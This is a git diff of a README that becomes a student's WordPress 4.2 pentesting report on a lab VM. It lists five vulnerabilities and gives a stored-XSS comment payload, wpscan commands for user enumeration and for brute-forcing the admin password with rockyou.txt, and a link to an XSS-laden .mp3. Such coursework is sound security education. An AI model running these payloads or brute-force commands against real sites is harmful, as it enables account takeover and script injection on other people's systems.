@@ -1,27 +1,80 @@
-# VirtualBox and Kali
+# Project 7 - WordPress Pentesting
 
-**Homework Instructions**: 
+Time spent: 10 hours spent in total
 
-1. Create a GIF recording of you starting your new Kali VM. Show VirtualBox Manger, click Start on your Kali box and end the recording when it reaches the login prompt. If it's larger than 5 MB, try to remove any large swathes of redudant frames. Save it as `vbox_kali.gif`.
-2. Create a GIF recording of you running the following command block in your Kali Terminal. Copy it to a text editor first and **replace the first 2 variables, name and univ, with your real name and college name**, then copy/paste the code block into a Terminal. 
+> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress
 
-```
-name="FirstName LastName"
-univ="University of Science"
+## Pentesting Report
 
-screenfetch
-echo $name'@'$univ
-```
+### 1. (Required) Large File Upload Error XSS
+  - [ ] Summary: 
+    - Vulnerability types:XSS
+    - Tested in version: 4.2
+    - Fixed in version: 4.2.15
+  - [ ] GIF Walkthrough: <img src="Large File Upload Error XSS.gif">
+  - [ ] Steps to recreate: An attacker can inject a malicious script in to the filename which a victim tries to upload leading to XSS inside the administrators control panel
+  - [ ] Affected source code:
+    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+### 2. (Required) Comment Cross-Site Scripting
+  - [ ] Summary: 
+    - Vulnerability types: XSS
+    - Tested in version: 4.2
+    - Fixed in version: 4.2.1
+  - [ ] GIF Walkthrough: <img src="Comment Cross-Site Scripting.gif">
+  - [ ] Steps to recreate: Paste the following text in a comment: ```<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px AAAAAAAAAAAA...[64 kb]..AAA'></a>```
+          Make sure the character length is 64kb or more.
+  - [ ] Affected source code:
+    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+### 3. (Required) User Enumeration
+  - [ ] Summary: 
+    - Vulnerability types: User Enumeration
+    - Tested in version: 4.2
+    - Fixed in version: 4.7.3
+  - [ ] GIF Walkthrough: <img src="User Enumeration.gif">
+  - [ ] Steps to recreate: Paste the following code to kali-linux terminal: ```wpscan --url wpdistillery.vm --enumerate u```
+  - [ ] Affected source code:
+    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+### 4. (Optional) Password Bruteforce Attack
+  - [ ] Summary: 
+    - Vulnerability types: Password Bruteforce Attack
+    - Tested in version: 4.2
+    - Fixed in version: 4.7.3
+  - [ ] GIF Walkthrough: <img src="Bruteforce Attack.gif">
+  - [ ] Steps to recreate: 
+          - Download the wordlist: ```apt-get install wordlists```
+          -Extract the wordlist inside: ```/usr/share/wordlists/```
+          -Paste the following code to kali-linux terminal: ```wpscan --url wpdistillery.vm --wordlist /usr/share/wordlists/rockyou.txt --username admin```
 
-Save the file as **screenfetch.gif**.
+  - [ ] Affected source code:
+    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+### 5. (Optional) Authenticated Cross-Site Scripting (XSS) via Media File Metadata
+  - [ ] Summary: 
+    - Vulnerability types: XSS
+    - Tested in version: 4.2
+    - Fixed in version: 4.7.3
+  - [ ] GIF Walkthrough: <img src="Authenticated Cross-Site Scripting (XSS) via Media File Metadata.gif">
+  - [ ] Steps to recreate: 
+          -Download the .mp3 from ```https://www.securify.nl/advisory/SFY20160742/xss.mp3```
+          -Upload this audio file to Media Library.
+          -Create a post with this audio inside a playlist.
 
-**Challenges and Problems**: 
+  - [ ] Affected source code:
+    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 
 
-### Installing VirtualBox and Kali
-<img src="vbox_kali.gif" alt="Virtualbox Installation">
- 
-### Running screenfetch
-<img src="screenfetch.gif" alt="Running screenfetch">
+## Assets
+
+List any additional assets, such as scripts or files
+
+## Resources
+
+- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
+- [WordPress Developer Reference](https://developer.wordpress.org/reference/)
+
+GIFs created with [LiceCap](http://www.cockos.com/licecap/).
+
+## Notes
+
+Describe any challenges encountered while doing the work
 
 ## License
 
